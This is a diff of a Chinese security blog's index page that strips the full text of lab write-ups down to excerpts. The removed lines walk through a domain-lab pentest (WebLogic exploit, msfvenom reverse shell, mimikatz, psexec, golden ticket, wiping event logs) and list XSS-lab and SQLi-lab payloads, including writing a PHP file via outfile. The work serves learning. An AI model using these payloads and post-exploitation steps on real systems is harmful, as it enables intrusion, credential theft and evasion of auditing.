@@ -212,7 +212,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2025-12-16 17:40:51 / Modified: 19:21:25" itemprop="dateCreated datePublished" datetime="2025-12-16T17:40:51+08:00">2025-12-16</time>
+      <time title="Created: 2025-12-16 17:40:51 / Modified: 19:34:49" itemprop="dateCreated datePublished" datetime="2025-12-16T17:40:51+08:00">2025-12-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -234,68 +234,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p>&#96;&#96;</p>
-<p><img src="/blog/images/Pasted-image-20251216140643.png"></p>
-<p>虚拟网络配置</p>
-<p><img src="/blog/images/Pasted-image-20251216143242.png"><br><strong>环境说明：</strong><br>内网网段：10.10.10.1&#x2F;24<br>DMZ网段：192.168.111.1&#x2F;24<br>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问)：<br>web主机登录使用de1ay用户登录密码是1qaz@WSX，如果需要管理登录的操作就使用这个账户：administrator&#x2F;1qaz@WSX </p>
-<p><strong>DC</strong><br>IP: 10.10.10.10<br>OS: windows 2012</p>
-<p><strong>WEB</strong><br>IP1：10.10.10.80<br>IP2： 192.168.111.80<br>OS：Windows 2008<br>管理员运行startweblogic<br><img src="/blog/images/WEB.de1ay.com-2025-12-16-14-39-15.png"></p>
-<p><strong>PC</strong><br>IP1：10.10.10.201</p>
-<p>IP2：192.168.111.201</p>
-<p>OS：Windows 7</p>
-<p><strong>攻击机</strong><br>IP：192.168.111.128<br>OS：kali linux</p>
-<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -Pn 192.168.111.80</span><br></pre></td></tr></table></figure>
-<p><img src="/blog/images/sec-kali-2025-12-16-14-51-38.png"><br>发现7001端口开了weblogic服务</p>
-<h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>使用dirsearch爆破7001端口下的目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.111.80:7001</span><br></pre></td></tr></table></figure>
-<p>扫到目录下有一个<br><a target="_blank" rel="noopener" href="http://192.168.111.80:7001/console/login/LoginForm.jsp">http://192.168.111.80:7001/console/login/LoginForm.jsp</a><br>访问看看<br><img src="/blog/images/Pasted-image-20251216150552.png"><br>发现使weblogic server的登录后台，尝试弱口令登录，但是失败了，遂更换思路<br>使用goby进行漏扫<br>WebLogic Server Version: 10.3.6.0<br>由于goby通用poc没有很早以前的weblogic poc，所以这里使用别人扫出来的&#x3D;&#x3D;cve-2017-10271&#x3D;&#x3D;进行渗透</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用weblogicexploit工具<br><img src="/blog/images/sec-kali-2025-12-16-16-07-34.png"><br>命令执行成功，注入蚁剑costom内存马连接上线</p>
-<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看以下进程，发现对方装了360</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>
-<p>没学过免杀，第一次尝试先去web机上关掉360吧</p>
-<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><p><strong>在蚁剑上传cs木马，上线cs</strong><br>进行一波域内信息收集</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#先将回显时间修改</span><br><span class="line">sleep 5</span><br><span class="line">#查看工作环境</span><br><span class="line">shell net config workstation</span><br><span class="line">#查看用户</span><br><span class="line">shell net user</span><br><span class="line">#查看域内主机</span><br><span class="line">net view</span><br></pre></td></tr></table></figure>
-<p><img src="/blog/images/sec-kali-2025-12-16-16-25-59.png"><br>得到域控ip<br>使用cs自带进行端口扫描<br>发现域控主机开了445端口</p>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>使用cs自带的权限提升，选择web监听器<br>成功提权到system</p>
-<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>先抓取明文密码，记录下sid<br>然后进行横移<br><img src="/blog/images/sec-kali-2025-12-16-16-37-14.png"><br>域控主机开了445端口，可以利用smb服务进行横向<br>创建smb监听器<br>使用抓到的administrator账户和密码以及smb监听器进行横向移动<br>成功上线域控DC<br>使用同样的办法也能拿下域内主机PC</p>
-<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>在域控DC上抓取hash<br><img src="/blog/images/Pasted-image-20251216164758.png"><br>成功抓到krbtgt的hash值<br>回到web机创建黄金票据<br><img src="/blog/images/Pasted-image-20251216164936.png"><br>user任意，domain sid是前面抓明文密码得到的<br>创建<br>成功后可以在web机上使用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure>
-<p>访问域内任意主机的文件<br><img src="/blog/images/Pasted-image-20251216165331.png"></p>
-<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>先创建msf反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.111.128 lport=5566 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>
-<p>进入msfconsole<br>进行监听<br>将木马上传蚁剑运行成功上线</p>
-<h4 id="权限维持-1"><a href="#权限维持-1" class="headerlink" title="权限维持"></a>权限维持</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getpid</span><br><span class="line">ps</span><br><span class="line">migrate lsass进程的pid</span><br></pre></td></tr></table></figure>
-<h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#加载mimikatz</span><br><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
-<p><img src="/blog/images/Pasted-image-20251216170939.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#meterpreter放到后台</span><br><span class="line">background</span><br><span class="line">#查看sessions</span><br><span class="line">sessions</span><br></pre></td></tr></table></figure>
-<h5 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">set sessions</span><br><span class="line">run</span><br><span class="line">#检查</span><br><span class="line">routeprint</span><br></pre></td></tr></table></figure>
-<p><img src="/blog/images/sec-kali-2025-12-16-17-14-17.png"><br>这样就可以使攻击机访问到内网</p>
-<h5 id="psexec横向"><a href="#psexec横向" class="headerlink" title="psexec横向"></a>psexec横向</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOSTS 10.10.10.10       # 域控 IP</span><br><span class="line">set SMBDomain de1ay.com       # 域名</span><br><span class="line">set SMBUser administrator     # 域管账号</span><br><span class="line">set SMBPass &lt;你的Hash或密码&gt;   </span><br><span class="line"></span><br><span class="line">set PAYLOAD windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"># 再次检查</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>成功上线域控<br><img src="/blog/images/Pasted-image-20251216171922.png"><br>后续黄金票据的生成就没做了</p>
-<h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><p>主要清理weblogic的日志， 用户等创建可以使用隐藏方式创建，痕迹清理也就是原路返回，看看你都做了什么操作。</p>
-<p>　- 有远程桌面权限时手动删除日志：</p>
-<p>　　开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志</p>
-<ul>
-<li>wevtutil：</li>
-</ul>
-<p>　　wevtutil el 列出系统中所有日志名称</p>
-<p>　　wevtutil cl system 清理系统日志</p>
-<p>　　wevtutil cl application 清理应用程序日志</p>
-<p>　　wevtutil cl security 清理安全日志</p>
-<ul>
-<li>meterperter自带清除日志功能：</li>
-</ul>
-<p>　　clearev 清除<strong>windows</strong>中的应用程序日志、系统日志、安全日志</p>
-<ul>
-<li>清除recent：</li>
-</ul>
-<p>　　在文件资源管理器中点击“查看”-&gt;“选项”-&gt;在常规-&gt;隐私中点击”清除”按钮或直接打开C:\Users\Administrator\Recent并删除所有内容或在命令行中输入del &#x2F;f &#x2F;s &#x2F;q “%userprofile%\Recent .</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
-<li>weblogic漏洞利用</li>
-<li>psexec横向</li>
-<li>黄金票据</li>
-</ul>
-
+          <h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/blog/2025/12/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -357,7 +304,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-16 19:21:22" itemprop="dateModified" datetime="2025-12-16T19:21:22+08:00">2025-12-16</time>
+      <time title="Modified: 2025-12-16 19:35:08" itemprop="dateModified" datetime="2025-12-16T19:35:08+08:00">2025-12-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -382,39 +329,14 @@
           <h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/xss-labs/level1.php?name=test">http://127.0.0.1/xss-labs/level1.php?name=test</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;/h2&gt;&lt;center&gt;&lt;img src=[level1.png](view-source:http://127.0.0.1/xss-labs/level1.png)&gt;&lt;/center&gt; </span><br><span class="line">&lt;h3 align=center&gt;payload的长度:4&lt;/h3&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
 <p>test直接被带入html标签中，传入<code>&lt;h1&gt;1&lt;/h1&gt;</code> 测试成功显示标题1<br><code>payload: ?name=&lt;script&gt;alert(0);&lt;/script&gt;</code></p>
-<p>&#96;&#96;</p>
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=[level2.php](view-source:http://127.0.0.1/xss-labs/level2.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure>
-<p>传入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>后发现被带入到input标签，并且没有转义<br>所以构造<br><code>payload:&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和1相关的结果.&lt;/h2&gt;&lt;center&gt; </span><br><span class="line">&lt;form action=[level3.php](view-source:http://127.0.0.1/xss-labs/level3.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&#x27;1&#x27;&gt; &lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<p>发现闭合为单引号<br>尝试：<code>&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code><br><code>&lt;input name=keyword value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&#39;&gt;</code><br>发现被&lt;,&gt;被转义<br>于是使用触发器onfocus,onmouseover,onclick<br>构造<code>payload: &#39; onfocus=javascript:alert(1) &#39;</code></p>
-<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>与level3类似，”改为’即可</p>
-<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>查看源码发现是使用双引号闭合，尝试上传：<code>&quot;&gt;&lt;script&gt;alert(0);&lt;/script&gt;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; </span><br><span class="line">&lt;form action=[level5.php](view-source:http://127.0.0.1/xss-labs/level5.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&quot;&quot;&gt;&lt;scr_ipt&gt;alert(1);&lt;/script&gt;&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<p>发现传入的<code>&lt;script&gt;</code>被转换为了<code>&lt;scr_ipt&gt;</code>导致标签失去作用<br>传on也同样出现被转换为o_n的情况<br>也就是上述的两种办法都不行<br>&#x3D;&#x3D;但是可以利用 JavaScript 的 URI&#x3D;&#x3D;<br><code>payload: ?keyword=&quot;&gt; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code><br><img src="/blog/images/Pasted_image_20251125181506.png"><br>点击hack即可</p>
-<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>这题的href会被替换成hr_ef<br>但是经过测试发现，这道题对敏感词区分大小写的过滤，所以使用<br>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- &quot;&gt; &lt;a hREF=javascript:alert(1)&gt;hack&lt;/a&gt;</span><br><span class="line">- &quot;&gt;&lt;SCRipt&gt;alert(1);&lt;/script&gt;</span><br><span class="line">- &quot; oNclick=javascript:alert(1) &quot;</span><br></pre></td></tr></table></figure>
-<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>尝试过后，会发现这关里 <code>script</code> 这个字符串会被过滤，即替换为空字符串。<br>然而，将所有搜索到的这个字符串替换为空后，对于拼接得到的新字符串，没有再一次进行检测。这是一个非常常见的安全问题。我们只要「双写」关键词即可。例如，<code>scriscriptpt</code> 被扫描替换一次后，会变成 <code>script</code>。<br><code>payload: &quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;</code></p>
-<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这一关开始出现两个可以进行xss攻击的地方</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword value=&quot;javascript:alert(0)&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;[javascr_ipt:alert(0)](view-source:http://127.0.0.1/xss-labs/javascr_ipt:alert\(0\))&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=[level8.jpg](view-source:http://127.0.0.1/xss-labs/level8.jpg)&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
-<p>在input标签处，经过测试，会对”,&lt;,&gt;进行转义，导致无法闭合input标签<br>在&lt;a href标签处，会对script，on进行替换<br>使用html实体编码绕过<br><code>payload：java&amp;#x0073;cript:alert(1)</code><br>编码格式：</p>
-<ul>
-<li>&amp;# + 字符的ascii编码的十进制</li>
-<li>或&amp;#x+字符的ascii编码的十六进制</li>
-</ul>
-<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>上传上一题的payload提示连接不合法，如果上传<a target="_blank" rel="noopener" href="http://test,则是一个合法的链接/">http://test，则是一个合法的链接</a><br>经过尝试可以发现，后端只检测传入的链接字符串是否包含 <code>http://</code>，并不要求其在开头。非常弱智的检测方式（而且甚至没有考虑 https）。那么我们只要在注入的 js 代码里加上注释，里面写上 <code>http://</code> 就行了。<br><code>payload: java&amp;#x0073;cript:alert(1)//http://</code></p>
-<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/xss-labs/level10.php?keyword=well%20done">http://127.0.0.1/xss-labs/level10.php?keyword=well%20done</a>!</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和well done!相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form id=search&gt; </span><br><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>可以发现有隐藏的可上传参数<br>构造payload:<br><code>?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=3</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;3&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>发现t_sort这个参数可以进行攻击<br>经过尝试，会将&lt;&gt;替换为空字符，于是使用onmouseover进行攻击<br>构造<br><code>payload:?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=&quot; onmouseover=javascript:alert(0) &quot;</code><br>但是由于type 仍然是hidden，不可见，所以页面没有反应<br>payload:<br><code>?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=&quot; onmouseover=javascript:alert(0) type &quot;</code><br>手动添加一个type覆盖掉后面，就出现了一个框，就成功了</p>
-<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>查看页面源码发现有一个input标签名为t_ref，并且字段为level10最后提交的url，那么这就是一个referer的注入<br>使用hackbar：<br><img src="/blog/images/Pasted_image_20251125201332.png"><br>即可过关</p>
-<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p><code>&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&quot; type=&quot;hidden&quot;&gt;</code><br>浏览器标识user-agent，可以通过burpsuite抓包修改<br>修改为：” onmouseover&#x3D;javascript:alert(0) type “发包即可成功</p>
-<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;call me maybe?&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>抓包查看<br><img src="/blog/images/Pasted_image_20251125204219.png"><br>发现t_cook是cookie<br>修改后发包<br>也是一样的payload</p>
-<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>查看页面源码发现了一个新属性，<code>ng-include</code>，ng-include指令一般用于包含外部HTML文件，ng-include属性的值可以是一个表达式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一域名下，也就是要调用同一域名下的其他网页。<br>传参：?src&#x3D;1<br>发现出现在了ng-include的值的位置，<br>传参src&#x3D;’ level1.php ‘<br>网页包含了level1的画面<br>构造payload:<br><code>?src=&#39; level1.php?name=&lt;img src=1 onerror=javascript:alert(1)&gt; &#39;</code><br>成功</p>
-<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>传参<code>&lt;script&gt;alert(0);&lt;/script&gt;</code>，发现&#x2F;和script被替换为了空格<br><code>&lt;center&gt;&lt;&amp;nbsp;&gt;alert(0);&lt;&amp;nbsp;&amp;nbsp;&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=[level16.png](view-source:http://localhost/xss-labs/level16.png)&gt;&lt;/center&gt;</code><br>但是&lt;&gt;没有，尝试&lt;a 标签<br><code>&lt;a href=&quot;javascript:alert(0)&quot;&gt;111</code><br>发现空格也被替换<br>使用%0a和%0d替换空格<br>payload: </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- &lt;a%0dhref=&quot;javas%0acript:alert(1)&quot;&gt;xss</span><br><span class="line">- &lt;a%0Donclick=alert(0)&gt;</span><br><span class="line">- &lt;a%0Donmouseover=alert(0)&gt;</span><br></pre></td></tr></table></figure>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/blog/2025/11/26/xss-labs/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -476,7 +398,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-16 19:20:52" itemprop="dateModified" datetime="2025-12-16T19:20:52+08:00">2025-12-16</time>
+      <time title="Modified: 2025-12-16 19:35:01" itemprop="dateModified" datetime="2025-12-16T19:35:01+08:00">2025-12-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -503,49 +425,14 @@
 <p><code>/?id=-1&#39; union select 1,2,3 --+</code> 修改有回显的行为需要查询的数据</p>
 <p><code>/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p>
 <p>爆出当前页面数据库的表名：emails,referers,uagents,users</p>
-<p>&#96;&#96;</p>
-<p><code>/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code> </p>
-<p>爆出列名：id,username,password</p>
-<p><code>/?id=-1&#39; union select 1,2,group_concat(password) from users--+</code> </p>
-<p>爆出所有的密码</p>
-<h3 id="less2-数字型注入"><a href="#less2-数字型注入" class="headerlink" title="less2:数字型注入"></a>less2:数字型注入</h3><p>传入参数直接被带入查询，没有任何引号包裹</p>
-<p>注入时无需’闭合</p>
-<p>其他与less1基本相同</p>
-<h3 id="less3-闭合"><a href="#less3-闭合" class="headerlink" title="less3:()闭合"></a>less3:()闭合</h3><p><code>/?id=1&#39;</code>观察报错信息发现有），尝试<code>/?id=1&#39;)</code>来闭合其他与前面相同</p>
-<h3 id="less4-”闭合"><a href="#less4-”闭合" class="headerlink" title="less4:”闭合"></a>less4:”闭合</h3><p>输入<code>/?id=1&#39;</code>不报错，输入<code>/?id=1&quot;</code>报错,报错信息显示有），使用<code>/?id=1&quot;)</code></p>
-<h3 id="less5-报错注入"><a href="#less5-报错注入" class="headerlink" title="less5:报错注入"></a>less5:报错注入</h3><p>正常不显示数据，但是会显示报错，<code>extractvalue(1,concat(0x5c,(select database())));</code>使用此函数0x5c,0x7e引起报错，返回database()的非法数据</p>
-<p>注意extractvalue()最多输出32个字符需要搭配substr()截断使用</p>
-<p>如：<code>extractvalue(1,concat(0x5c,substr((select database()),-20)));</code> 输出后20位</p>
-<p><code>/?id=-1%27%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%23</code></p>
-<p>成功爆出数据库名security</p>
-<p><code>updatexml(1,concat(0x7e,database(),0x7e,user()),1)</code> 同样这个函数也是相同的效果</p>
-<h3 id="less6"><a href="#less6" class="headerlink" title="less6:"></a>less6:</h3><p>同款报错注入，不过用双引号闭合</p>
-<p><code>/?id=1&quot;%20union%20select%201,2,updatexml(1,concat(0x7e,database()),1)--+</code></p>
-<h3 id="less7-outfile"><a href="#less7-outfile" class="headerlink" title="less7: outfile"></a>less7: outfile</h3><p>发现只有两种回显，布尔盲注，提示使用outfile，先判断闭合，擦查看源代码发现是</p>
-<p><code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code>  </p>
-<p>即采用<code>/?id=1&#39;))</code>闭合，文件保存路径通过以前关卡的报错获得</p>
-<p><code>/?id=-1&#39;)) union select 1,2,database() into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-7/1.txt&#39;--+</code> </p>
-<p>在可以在web网页下写入文件是写入shell文件更为便捷</p>
-<p><code>/?id=-1&#39;)) union select 1,2,&quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-7/1.php&#39;--+</code> </p>
-<h3 id="less8"><a href="#less8" class="headerlink" title="less8:"></a>less8:</h3><p>报错完全无回显，先用延时注入判断闭合符号</p>
-<p><code>/?id=1&#39; and sleep(5)--+</code>  延时成功则使用’闭合</p>
-<p><code>/?id=-1&#39; union select 1,2,&quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-8/1.php&#39;--+</code> </p>
-<p>与less7相同 使用outfile</p>
-<p>其他解法：</p>
-<p>编写exp爆出数据库名：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">host = <span class="string">&quot;http://127.0.0.1/Less-8/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select database()&quot;</span></span><br><span class="line"><span class="comment"># sql = &quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span 